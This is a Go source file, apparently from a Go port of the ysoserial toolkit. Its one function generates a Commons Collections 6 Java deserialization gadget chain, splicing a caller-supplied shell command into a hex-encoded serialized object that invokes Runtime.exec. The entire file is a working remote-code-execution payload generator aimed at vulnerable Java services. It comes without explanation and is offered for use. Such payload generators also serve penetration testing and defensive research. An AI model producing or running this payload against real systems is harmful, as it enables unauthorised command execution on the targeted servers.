package gadget

import (
	"bytes"
	"encoding/hex"
	"github.com/EmYiQing/Gososerial/ysoserial/util"
	"strings"
)

func GetCommonsCollections6(cmd string) []byte {
	prefix := "ACED0005737200116A6176612E7574696C2E48617368536574BA44859596B" +
		"8B7340300007870770C000000023F40000000000001737200346F72672E61706163" +
		"68652E636F6D6D6F6E732E636F6C6C656374696F6E732E6B657976616C75652E546" +
		"965644D6170456E7472798AADD29B39C11FDB0200024C00036B65797400124C6A61" +
		"76612F6C616E672F4F626A6563743B4C00036D617074000F4C6A6176612F7574696" +
		"C2F4D61703B7870740003666F6F7372002A6F72672E6170616368652E636F6D6D6F" +
		"6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E79109" +
		"40300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F" +
		"6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6" +
		"F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E" +
		"63746F72732E436861696E65645472616E73666F726D657230C797EC287A9704020" +
		"0015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F" +
		"636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B787" +
		"07572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C65637469" +
		"6F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000057" +
		"372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E73" +
		"2E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114" +
		"102B1940200014C000969436F6E7374616E7471007E00037870767200116A617661" +
		"2E6C616E672E52756E74696D65000000000000000000000078707372003A6F72672" +
		"E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F" +
		"72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B0" +
		"00569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D" +
		"6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B6" +
		"9506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870" +
		"757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000" +
		"078700000000274000A67657452756E74696D65757200125B4C6A6176612E6C616E" +
		"672E436C6173733BAB16D7AECBCD5A990200007870000000007400096765744D657" +
		"4686F647571007E001B00000002767200106A6176612E6C616E672E537472696E67" +
		"A0F0A4387A3BB34202000078707671007E001B7371007E00137571007E001800000" +
		"002707571007E001800000000740006696E766F6B657571007E001B000000027672" +
		"00106A6176612E6C616E672E4F626A6563740000000000000000000000787076710" +
		"07E00187371007E0013757200135B4C6A6176612E6C616E672E537472696E673BAD" +
		"D256E7E91D7B47020000787000000001"
	finalCmd := bytes.Buffer{}
	finalCmd.WriteString("74")
	data := strings.ToUpper(hex.EncodeToString([]byte(cmd)))
	if len(data)/2 > 0xFFFF {
		return []byte{}
	}
	dataLen := util.Int16ToBytes(uint16(len(data) / 2))
	finalCmd.WriteString(dataLen)
	finalCmd.WriteString(data)
	suffix := "740004657865637571007E001B0000000171007E00207371007E000F73720" +
		"0116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576" +
		"616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020" +
		"000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C3" +
		"1660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703" +
		"F4000000000000077080000001000000000787878"
	ser, err := hex.DecodeString(prefix + finalCmd.String() + suffix)
	if err != nil {
		return []byte{}
	}
	return ser
}
